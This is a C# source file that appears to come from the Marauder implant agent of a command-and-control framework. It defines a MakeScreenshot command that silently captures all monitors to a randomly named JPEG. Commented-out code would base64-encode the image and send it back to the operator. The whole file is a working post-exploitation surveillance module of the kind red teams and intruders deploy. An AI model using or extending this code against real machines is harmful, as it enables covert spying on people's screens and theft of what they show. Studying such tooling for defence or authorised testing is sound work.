using System;
using System.IO;
using System.Collections.Generic;
using Newtonsoft.Json;

using Faction.Modules.Dotnet.Common;
using Marauder.Objects;
using Marauder.Services;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;

namespace Marauder.Commands
{
    class MakeScreenshot : Command
    {

        public override string Name { get { return "MakeScreenshot"; } }

        public override CommandOutput Execute(Dictionary<String, String> Parameters)
        {
            CommandOutput output = new CommandOutput();
            try
            {
                // Determine the size of the "virtual screen", which includes all monitors.
                int screenLeft = SystemInformation.VirtualScreen.Left;
                int screenTop = SystemInformation.VirtualScreen.Top;
                int screenWidth = SystemInformation.VirtualScreen.Width;
                int screenHeight = SystemInformation.VirtualScreen.Height;



                string path = randomString() + "-tmp.jpg";

                // Create a bitmap of the appropriate size to receive the screenshot.
                using (Bitmap bmp = new Bitmap(screenWidth, screenHeight))
                {
                    // Draw the screenshot into our bitmap.
                    using (Graphics g = Graphics.FromImage(bmp))
                    {
                        g.CopyFromScreen(screenLeft, screenTop, 0, 0, bmp.Size);
                    }

                    // Do something with the Bitmap here, like save it to a file:
                    bmp.Save(path, ImageFormat.Jpeg);
                }

                //Upload screenshot after is has been taken
                long length = new FileInfo(path).Length;
                output.Complete = true;

                output.Message += $"Screenshot created - ToDo: Implement auto upload.";
                /*
                byte[] fileBytes = File.ReadAllBytes(path);
                output.Message = $"{path} has been uploaded";
                output.Type = "File";
                output.Content = Convert.ToBase64String(fileBytes);
                output.ContentId = path;

                output.Success = true;
                output.Message += $"\nScreenshot was saved in the same directory as the Marauder agent!";
                */

            }
            catch (Exception ex)
            {
                output.Complete = true;
                output.Success = false;
                output.Message = ex.Message;
            }

            return output;
        }

        private string randomString ()
        { 
            var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var stringChars = new char[8];
            var random = new Random();

            for (int i = 0; i<stringChars.Length; i++)
            {
                stringChars[i] = chars[random.Next(chars.Length)];
            }
            var finalString = new String(stringChars);

            return finalString;
        }
    }
}